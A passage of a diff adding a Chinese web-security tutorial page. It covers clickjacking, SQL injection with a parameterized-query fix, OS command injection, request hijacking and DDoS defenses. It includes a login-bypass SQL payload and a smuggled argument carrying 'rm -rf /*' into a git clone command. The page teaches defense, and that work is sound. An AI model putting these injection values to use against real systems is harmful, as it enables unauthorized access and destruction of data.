+<span class="w">      </span><span class="nx">top</span><span class="p">.</span><span class="nx">location</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">self</span><span class="p">.</span><span class="nx">location</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>以上代码的作⽤就是当通过 iframe 的⽅式加载⻚页⾯面时，攻击者的⽹网⻚页直接不不显示所有内容了。 </p>
+<h3 id="sql">SQL注⼊<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h3>
+<p>例如登录页面，如果直接把用户名和密码作为 SQL 语句参数去执行，那么可以这样注入</p>
+<div class="highlight"><pre><span></span><code><span class="o">#</span><span class="w"> </span><span class="err">填⼊特殊密码</span><span class="w"> </span><span class="mi">1</span><span class="s1">&#39;or&#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+
+<span class="o">#</span><span class="w"> </span><span class="err">拼接后的</span><span class="k">SQL</span>
+<span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">test</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;laowang&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="k">or</span><span class="s1">&#39;</span>
+
+<span class="s1"> # 实际上 where 有了 or 1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span><span class="w"> </span>
+<span class="w"> </span><span class="o">#</span><span class="w"> </span><span class="err">始终返回真，就登录成功了</span>
+</code></pre></div>
+<h4 id="_8">防御<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h4>
+<p>所有的查询语句建议使⽤数据库提供的参数化查询接口，参数化的语句使⽤参数，而不是将⽤户 输⼊变量嵌⼊到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query ⽅法中的 ? 占位参数。</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 错误写法</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sb">` SELECT * FROM test.user WHERE username = &#39;</span><span class="si">${</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="si">}</span><span class="sb">&#39; AND password = &#39;</span><span class="si">${</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="si">}</span><span class="sb">&#39;`</span><span class="p">;</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;sql&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">sql</span><span class="p">)</span>
+<span class="nx">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">query</span><span class="p">(</span><span class="nx">sql</span><span class="p">)</span>
+
+<span class="c1">//正确的写法</span>
+<span class="kd">const</span><span class="w"> </span><span class="nx">sql</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;SELECT * FROM test.user WHERE username = ? AND password = ?&#39;</span><span class="p">;</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;sql&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">sql</span><span class="p">,</span><span class="w"> </span><span class="p">)</span>
+<span class="nx">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">query</span><span class="p">(</span><span class="nx">sql</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span><span class="w"> </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">]);</span>
+</code></pre></div>
+<p>严格限制Web应⽤的数据库的操作权限，给此⽤户提供仅能够满足其工作的最低权限，从⽽而 最大限度的减少注⼊攻击对数据库的危害 后端代码检查输⼊的数据是否符合预期，严格限制变量量的类型，例如使⽤正则表达式进⾏一些匹配处理。</p>
+<p>对进⼊数据库的特殊字符('，"，\，&lt;，&gt;，&amp;，*，; 等)进⾏转义处理，或编码转换。基本上所有的后端语⾔言都有对字符串串进⾏转义处理的⽅法，⽐比如 lodash 的 lodash._escapehtmlchar 库。</p>
+<h3 id="os">OS注⼊<a class="headerlink" href="#os" title="Permanent link">&para;</a></h3>
+<p>OS命令注⼊和SQL注⼊差不不多，只不不过SQL注⼊是针对数据库的，⽽而OS命令注⼊是针对操作系统的。OS命令 注⼊攻击指通过Web应⽤，执⾏⾮非法的操作系统命令达到攻击的⽬目的。只要在能调⽤Shell函数的地⽅就有 存在被攻击的⻛风险。倘若调⽤Shell时存在疏漏漏，就可以执⾏插⼊的⾮非法命令。</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// 以 Node.js 为例例，假如在接⼝口中需要从 github 下载⽤户指定的 repo const exec = require(&#39;mz/child_process&#39;).exec;</span>
+<span class="kd">let</span><span class="w"> </span><span class="nx">params</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="cm">/* ⽤户输⼊的参数 */</span><span class="p">};</span>
+<span class="nx">exec</span><span class="p">(</span><span class="sb">`git clone </span><span class="si">${</span><span class="nx">params</span><span class="p">.</span><span class="nx">repo</span><span class="si">}</span><span class="sb"> /some/path`</span><span class="p">);</span>
+</code></pre></div>
+<p>如果传⼊的参数是会怎样</p>
+<div class="highlight"><pre><span></span><code>  https://github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;
+</code></pre></div>
+<h3 id="_9">请求劫持<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<ul>
+<li>DNS劫持 顾名思义，DNS服务器器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不不是预期的ip</li>
+<li>HTTP劫持 运营商劫持，此时⼤大概只能升级HTTPS了</li>
+</ul>
+<h3 id="ddos">DDOS<a class="headerlink" href="#ddos" title="Permanent link">&para;</a></h3>
+<p><a href="http://www.ruanyifeng.com/blog/2018/06/ddos.html">http://www.ruanyifeng.com/blog/2018/06/ddos.html</a> 阮阮⼀一峰</p>
+<p>distributed denial of service</p>
+<p>DDOS 不不是⼀一种攻击，⽽而是⼀一⼤大类攻击的总称。它有⼏几⼗十种类型，新的攻击⽅法还在不不断发明出来。⽹网 站运⾏的各个环节，都可以是攻击⽬目标。只要把⼀一个环节攻破，使得整个流程跑不不起来，就达到了瘫痪 服务的⽬目的。</p>
+<p>其中，⽐比较常⻅见的⼀一种攻击是 cc 攻击。它就是简单粗暴暴地送来⼤大量量正常的请求，超出服务器器的最⼤大承 受量量，导致宕机。我遭遇的就是 cc 攻击，最多的时候全世界⼤大概20多个 IP 地址轮流发出请求，每个地 址的请求量量在每秒200次~300次。我看访问⽇日志的时候，就觉得那些请求像洪⽔水⼀一样涌来，⼀一眨眼就是 ⼀一⼤大堆，⼏几分钟的时间，⽇日志⽂文件的体积就⼤大了100MB。说实话，这只能算⼩攻击，但是我的个⼈人⽹网站 没有任何防护，服务器器还是跟其他⼈人共享的，这种流量量⼀一来⽴立刻就下线了。</p>
+<p>常⻅见攻击⽅式</p>
+<p>SYN Flood</p>
+<p>此攻击通过向⽬目标发送具有欺骗性源IP地址的⼤大量量TCP“初始连接请求”SYN数据包来利利⽤TCP握 ⼿。⽬目标机器器响应每个连接请求，然后等待握⼿中的最后⼀一步，这⼀一步从未发⽣生过，耗尽了进程 中的⽬目标资源。</p>
+<p>HTTP Flood</p>
+<p>此攻击类似于同时在多个不不同计算机上反复按Web浏览器器中的刷新 - ⼤大量量HTTP请求泛滥服务器器， 导致拒绝服务。</p>
+<p>防御⼿段</p>
+<p>- 备份⽹网站 备份⽹网站不不⼀一定是全功能的，如果能做到全静态浏览，就能满⾜足需求。最低限度应该可以显示公告，告诉⽤户，⽹网站出了问题，正在全⼒力力抢修。
+ - HTTP 请求的拦截 ⾼防IP -靠谱的运营商 多个 Docker</p>
+<p>硬件 服务器器 防⽕火墙 - 带宽扩容 + CDN</p>
+<p>提⾼犯罪成本</p>
+
+
+
+
+
+
+
+  
+    
+  
+  
+
+
+  <aside class="md-source-file">
+    
+      
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Last update">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
+    </span>
+    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">November 9, 2024</span>
+  </span>
+
+    
+    
+    
+      
+  
+  <span class="md-source-file__fact">
+    <span class="md-icon" title="Contributors">
+      
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 5.5A3.5 3.5 0 0 1 15.5 9a3.5 3.5 0 0 1-3.5 3.5A3.5 3.5 0 0 1 8.5 9 3.5 3.5 0 0 1 12 5.5M5 8c.56 0 1.08.15 1.53.42-.15 1.43.27 2.85 1.13 3.96C7.16 13.34 6.16 14 5 14a3 3 0 0 1-3-3 3 3 0 0 1 3-3m14 0a3 3 0 0 1 3 3 3 3 0 0 1-3 3c-1.16 0-2.16-.66-2.66-1.62a5.54 5.54 0 0 0 1.13-3.96c.45-.27.97-.42 1.53-.42M5.5 18.25c0-2.07 2.91-3.75 6.5-3.75s6.5 1.68 6.5 3.75V20h-13zM0 20v-1.5c0-1.39 1.89-2.56 4.45-2.9-.59.68-.95 1.62-.95 2.65V20zm24 0h-3.5v-1.75c0-1.03-.36-1.97-.95-2.65 2.56.34 4.45 1.51 4.45 2.9z"/></svg>
+      
+    </span>
+    <nav>
+      
+        <a href="mailto:1822852997@qq.com">Michael An</a>, 
+        <a href="mailto:2331806369@qq.com">Michael An</a>
+    </nav>
+  </span>
+
+    
+    
+  </aside>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; Michael An
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../js/baidu-statistics.min.js"></script>
+      
+        <script src="../../js/history.min.js"></script>
+      
+    
+  </body>
+</html>
